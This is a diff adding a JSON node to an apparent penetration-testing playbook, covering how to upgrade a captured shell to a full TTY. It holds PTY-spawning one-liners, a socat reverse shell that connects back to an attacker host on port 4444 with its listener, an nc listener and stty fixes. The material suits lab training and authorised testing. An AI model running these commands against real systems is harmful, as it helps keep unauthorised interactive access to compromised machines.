@@ -1,0 +1,22 @@
+{
+  "id": "shell_upgrade",
+  "phase": "SHELL",
+  "title": "Upgrade to Full TTY",
+  "body": "Do this immediately every time you get a shell. A dumb shell kills your process on Ctrl+C, breaks tab completion, and makes vim unusable. The python + Ctrl+Z trick is the standard.",
+  "cmd": "# ── STEP 1: SPAWN A PTY ──────────────────────────────\n# Python3 (most common)\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# If you get: bash: /root/.bashrc: Permission denied\n# = service account with homedir set to /root but not root\n# bash tries to source /root/.bashrc and fails\n# Fix: use /bin/sh instead\npython3 -c 'import pty; pty.spawn(\"/bin/sh\")'\n# Lab validated: Confluence box — confluence user, homedir /root\n# sh has no profile/bashrc sourcing = no permission error\n\n# Python2 fallback\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# script fallback (if no python)\n/usr/bin/script -qc /bin/bash /dev/null\nscript /dev/null -c bash\n\n# socat (best — fully interactive, no extra steps needed)\n# Attacker:\nsocat file:`tty`,raw,echo=0 tcp-listen:4444\n# Target:\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:4444\n\n# ── STEP 2: CTRL+Z TRICK ─────────────────────────────\n# After spawning PTY — background the shell\n# Press: Ctrl+Z\n# (shell goes to background, you're back on Kali)\n\n# ── STEP 3: FIX YOUR TERMINAL ────────────────────────\nstty raw -echo; fg\n# stty raw    = pass keystrokes directly (Ctrl+C works now)\n# -echo       = stop Kali echoing what you type\n# fg          = bring shell back to foreground\n# (you may need to press Enter once after fg)\n\n# ── STEP 4: FIX TERMINAL SIZE AND ENVIRONMENT ─────────\nexport TERM=xterm-256color\nexport SHELL=/bin/bash\n\n# Check your current terminal size on Kali first:\n# stty size   (on Kali — shows rows cols)\nstty rows 38 columns 200\n# Set to match your actual terminal dimensions\n\n# ── STEP 5: OPTIONAL CLEANUP ──────────────────────────\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nalias ls='ls -arlht --color=auto'\nreset   # if display is garbled after Ctrl+Z\n\n# ── IF PYTHON NOT AVAILABLE ──────────────────────────\nwhich python python3 perl ruby php 2>/dev/null\n# perl\nperl -e 'exec \"/bin/bash\";'\n# ruby\nruby -e 'exec \"/bin/bash\"'\n# awk\nawk 'BEGIN {system(\"/bin/bash\")}'\n# find\nfind / -name / -exec /bin/bash ;\n\n# ── CHECK WHAT SHELL YOU HAVE ─────────────────────────\necho $0\necho $SHELL\ncat /etc/shells\nwhich bash sh zsh\n\n# ── RLWRAP (for nc shells on Kali — before upgrade) ───\n# On Kali, wrap nc with rlwrap for arrow keys + history\nrlwrap nc -nlvp $lport",
+  "warn": "After stty raw -echo if something goes wrong and your terminal is broken — type 'reset' blindly and hit Enter. It will restore your terminal even if you can't see what you're typing.",
+  "choices": [
+    {
+      "label": "Linux shell — start privesc",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "Windows shell — start privesc",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "Shell keeps dying — troubleshoot",
+      "next": "shell_troubleshoot"
+    }
+  ]
+}
